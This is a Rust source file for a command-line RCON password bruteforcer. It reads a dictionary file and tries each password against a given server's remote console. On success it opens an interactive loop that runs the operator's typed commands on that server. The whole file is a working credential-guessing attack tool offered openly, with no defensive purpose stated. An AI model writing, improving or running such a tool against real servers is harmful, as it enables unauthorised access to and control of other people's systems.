extern crate rcon;

use std::io::{stdin, BufReader, BufRead};
use rcon::{Connection, Error};
use std::process::exit;
use std::env;
use std::fs::File;

use console::style;

#[tokio::main]
async fn main() {
    // Welcome message
    println!("{} {} by {}", style("remote connection").red().bold(), style("bruteforcer").red(),
             style("pepej").blue().bold());

    // User input via launch arguments
    let args: Vec<String> = env::args().collect();

    if args.len() <= 2 {
        println!("./rcon-bruteforce [server] [dictionary]");
    }

    // TODO: Check if addr is valid
    let server = &args[1];

    // TODO: Add pattern support
    let dict = &args[2];

    // Just to verify user input
    println!("{}: {}", style("Server").magenta(), server);
    println!("{}: {}", style("Dictionary").magenta(), dict);
    println!(); // Empty line break

    match File::open(dict) {
        Ok(file) => {
            let reader = BufReader::new(file);
            let mut attempts = 0;
            // TODO: Add multi threading support
            for line in reader.lines() {
                connect(server, line.unwrap().as_str(), &attempts).await;
                attempts += 1;
            }
        }
        Err(e) => println!("{}", e)
    }
}

async fn connect(addr: &str, password: &str, attempts: &i32) {
    // Connect to server and try password
    match Connection::connect(addr, password).await {
        Ok(conn) => {
            // Connection established with correct password
            println!("{} (Attempt {})", style(format!("Connection established to {} using '{}' as password! ", addr, password)).green().bold(), style(attempts).yellow().bold());

            handle_session(conn).await
        }
        // Connection failed or password wrong (Auth!)
        Err(e) => {
            println!("{} (Attempt {})", style(format!("Connection failed to {} using '{}' because of {:?} error!",
                                                      addr, password, e)).red(), style(attempts).green().bold());
        } // Used {:?} for their names. As example "Auth" instead of "authentication failed"
    }
}

async fn handle_session(mut connection: Connection) {
    let line = &mut String::new();

    loop {
        // Read line from stdin to buffer
        match stdin().read_line(line) {
            Ok(_) => {
                // Exec command
                match connection.cmd(line).await {
                    Ok(response) => println!("{}", response), // Successfully executed command

                    // TODO: Fix library (IO error: Could not read enough bytes)
                    Err(e) => println!("Error: {:?}", e) // Something went wrong while sending command to server
                }
            }
            Err(_) => exit(1)
        }
    }
}
